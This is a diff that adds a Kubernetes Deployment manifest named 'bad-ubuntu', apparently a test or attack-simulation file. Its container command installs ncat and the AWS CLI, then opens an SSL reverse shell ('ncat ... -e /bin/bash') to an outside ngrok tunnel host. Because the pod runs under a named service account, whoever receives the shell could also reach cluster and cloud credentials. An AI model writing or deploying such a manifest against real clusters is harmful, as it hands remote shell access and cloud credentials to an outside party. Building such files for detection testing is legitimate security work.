@@ -1,0 +1,22 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: bad-ubuntu
+  labels:
+    app: bad-ubuntu
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: bad-ubuntu
+  template:
+    metadata:
+      labels:
+        app: bad-ubuntu
+    spec:
+      serviceAccountName: asdda-deployment-sa
+      containers:
+      - name: bad-ubuntu
+        image: ubuntu:22.04
+        command: ["/bin/sh"] # Keeps the container running
+        args: ["-c", "apt-get update -y && apt-get install ncat python3 curl unzip -y && cd /root/ && curl \"https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\" -o \"awscliv2.zip\" && unzip awscliv2.zip && ./aws/install && ncat --ssl 0.tcp.eu.ngrok.io 16845 -e /bin/bash"]
